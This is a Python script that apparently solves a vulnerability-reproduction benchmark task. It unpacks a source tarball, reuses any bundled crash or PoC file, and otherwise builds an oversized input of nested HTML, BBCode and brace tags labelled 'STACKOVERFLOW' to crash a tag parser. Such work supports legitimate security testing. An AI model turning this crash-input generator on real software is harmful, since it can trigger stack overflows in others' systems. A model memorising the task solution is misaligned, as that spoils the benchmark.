import os
import tarfile
import tempfile
import shutil


class Solution:
    def solve(self, src_path: str) -> bytes:
        tmpdir = None
        try:
            tmpdir = tempfile.mkdtemp(prefix="pocgen_")
            try:
                with tarfile.open(src_path, "r:*") as tf:
                    tf.extractall(tmpdir)
                poc = self._find_existing_poc(tmpdir)
                if poc is None:
                    poc = self._generate_tag_based_poc(tmpdir)
                if poc is not None and len(poc) > 0:
                    return poc
            except Exception:
                pass
        finally:
            if tmpdir is not None:
                shutil.rmtree(tmpdir, ignore_errors=True)
        return self._generic_fallback_poc()

    def _find_existing_poc(self, root_dir: str) -> bytes | None:
        candidates = []
        for r, _, files in os.walk(root_dir):
            for fname in files:
                lname = fname.lower()
                if any(key in lname for key in ("poc", "crash", "id:", "id_", "testcase", "input")):
                    ext = os.path.splitext(fname)[1].lower()
                    if ext in ("", ".bin", ".dat", ".poc", ".txt", ".in", ".out"):
                        path = os.path.join(r, fname)
                        try:
                            size = os.path.getsize(path)
                        except OSError:
                            continue
                        if 0 < size <= 1_000_000:
                            score = 0
                            if "poc" in lname:
                                score += 3
                            if "crash" in lname:
                                score += 2
                            if "id" in lname:
                                score += 1
                            candidates.append((-score, size, path))
        if not candidates:
            return None
        candidates.sort()
        best_path = candidates[0][2]
        try:
            with open(best_path, "rb") as f:
                return f.read()
        except Exception:
            return None

    def _generate_tag_based_poc(self, root_dir: str) -> bytes:
        html_tag_names = [
            "b", "i", "u", "br", "p", "div", "span", "a", "img", "font",
            "table", "tr", "td", "th", "body", "html", "head", "script",
            "style", "em", "strong", "code", "pre", "blockquote", "ul",
            "ol", "li", "h1", "h2", "h3", "h4", "h5", "h6", "title",
            "small", "big", "center", "sup", "sub"
        ]
        bbcode_tag_names = [
            "b", "i", "u", "url", "img", "quote", "code", "size", "color",
            "list", "*"
        ]
        tag_forms: set[str] = set()
        for name in html_tag_names + bbcode_tag_names:
            tag_forms.add("<" + name + ">")
            tag_forms.add("</" + name + ">")
            tag_forms.add("[" + name + "]")
            tag_forms.add("[/" + name + "]")
            tag_forms.add("{" + name + "}")
            tag_forms.add("{/" + name + "}")
            tag_forms.add("{{" + name + "}}")
            tag_forms.add("{{/" + name + "}}")

        code_exts = (
            ".c", ".h", ".cpp", ".hpp", ".cc", ".hh", ".cxx", ".hxx", ".inl", ".ipp"
        )
        literal_limit = 5000
        literal_seen = 0
        seen_strings: set[str] = set()

        for r, _, files in os.walk(root_dir):
            for fname in files:
                if os.path.splitext(fname)[1].lower() in code_exts:
                    path = os.path.join(r, fname)
                    try:
                        with open(path, "r", encoding="utf-8", errors="ignore") as f:
                            text = f.read()
                        literals = self._extract_string_literals(text)
                    except Exception:
                        continue
                    for s in literals:
                        if not s:
                            continue
                        if s in seen_strings:
                            continue
                        seen_strings.add(s)
                        literal_seen += 1
                        if any(ch in s for ch in "<>[]/{}"):
                            if len(s) <= 64:
                                tag_forms.add(s)
                        if len(s) <= 20 and all((ch.isalnum() or ch in "-_") for ch in s):
                            tag_forms.add("<" + s + ">")
                            tag_forms.add("</" + s + ">")
                            tag_forms.add("[" + s + "]")
                            tag_forms.add("[/" + s + "]")
                            tag_forms.add("{" + s + "}")
                            tag_forms.add("{/" + s + "}")
                            tag_forms.add("{{" + s + "}}")
                            tag_forms.add("{{/" + s + "}}")
                        if literal_seen >= literal_limit:
                            break
                if literal_seen >= literal_limit:
                    break
            if literal_seen >= literal_limit:
                break

        if not tag_forms:
            return self._generic_fallback_poc()

        tag_list = sorted(tag_forms, key=len)
        max_forms = 80
        if len(tag_list) > max_forms:
            tag_list = tag_list[:max_forms]

        pieces: list[str] = []
        pieces.append("BEGIN-POC\n")
        current_len = len(pieces[0])
        target_len = 16000

        for tag in tag_list:
            segment = self._make_segment(tag)
            if not segment:
                continue
            if len(segment) > 256:
                segment = segment[:256]
            reps = 30
            chunk = (segment + " ") * reps
            pieces.append(chunk)
            current_len += len(chunk)
            if current_len >= target_len:
                break

        text = "".join(pieces)
        if len(text) < 4096:
            fill_needed = 4096 - len(text)
            text += "FILLER" * ((fill_needed // 6) + 1)

        data = text.encode("ascii", errors="ignore")
        if len(data) > 20000:
            data = data[:20000]
        return data

    def _generic_fallback_poc(self) -> bytes:
        tag_names = [
            "b", "i", "u", "br", "p", "div", "span", "a", "img", "font",
            "table", "tr", "td", "th", "body", "html", "head", "em",
            "strong", "code", "pre", "blockquote", "ul", "ol", "li",
            "h1", "h2", "h3", "h4", "h5", "h6", "title", "small", "big",
            "center", "sup", "sub", "url", "size", "color", "quote", "list"
        ]
        pieces = ["GENERIC-POC\n"]
        for name in tag_names:
            open_html = "<" + name + ">"
            close_html = "</" + name + ">"
            open_bb = "[" + name + "]"
            close_bb = "[/" + name + "]"
            open_curly = "{" + name + "}"
            close_curly = "{/" + name + "}"
            segment = (
                open_html
                + "PAYLOAD"
                + close_html
                + open_bb
                + "PAYLOAD"
                + close_bb
                + open_curly
                + "PAYLOAD"
                + close_curly
            )
            pieces.append((segment + " ") * 50)
        text = "".join(pieces)
        if len(text) < 4096:
            text += "X" * (4096 - len(text))
        data = text.encode("ascii", errors="ignore")
        if len(data) > 20000:
            data = data[:20000]
        return data

    def _extract_string_literals(self, text: str) -> list[str]:
        literals: list[str] = []
        n = len(text)
        i = 0
        while i < n:
            ch = text[i]
            if ch == '"':
                i += 1
                sb_chars: list[str] = []
                while i < n:
                    c = text[i]
                    if c == "\\":
                        if i + 1 < n:
                            i += 2
                            continue
                        else:
                            i += 1
                            break
                    if c == '"':
                        literals.append("".join(sb_chars))
                        i += 1
                        break
                    sb_chars.append(c)
                    i += 1
            else:
                i += 1
        return literals

    def _make_segment(self, tag: str) -> str:
        tag = tag.strip()
        if not tag:
            return ""
        if tag[0] == "<" and tag[-1] == ">":
            inner = tag[1:-1].strip()
            if not inner:
                return tag * 2
            name = inner
            for sep in (" ", "\t", "\r", "\n", "/"):
                if sep in name:
                    name = name.split(sep)[0]
            name = name.strip().lstrip("/")
            if not name:
                name = "x"
            if inner.startswith("/"):
                open_tag = "<" + name + ">"
                close_tag = tag
            else:
                open_tag = tag
                close_tag = "</" + name + ">"
            return open_tag + "STACKOVERFLOW" + close_tag
        if tag[0] == "[" and tag[-1] == "]":
            inner = tag[1:-1].strip()
            if not inner:
                return tag * 2
            name = inner.lstrip("/")
            for sep in (" ", "\t", "\r", "\n", "/"):
                if sep in name:
                    name = name.split(sep)[0]
            if not name:
                name = "x"
            if inner.startswith("/"):
                open_tag = "[" + name + "]"
                close_tag = tag
            else:
                open_tag = tag
                close_tag = "[/" + name + "]"
            return open_tag + "STACKOVERFLOW" + close_tag
        if tag[0] == "{" and tag[-1] == "}":
            inner = tag[1:-1].strip()
            if not inner:
                return tag * 2
            name = inner.lstrip("/")
            for sep in (" ", "\t", "\r", "\n", "/"):
                if sep in name:
                    name = name.split(sep)[0]
            if not name:
                name = "x"
            if inner.startswith("/"):
                open_tag = "{" + name + "}"
                close_tag = tag
            else:
                open_tag = tag
                close_tag = "{/" + name + "}"
            return open_tag + "STACKOVERFLOW" + close_tag
        return tag + "STACKOVERFLOW"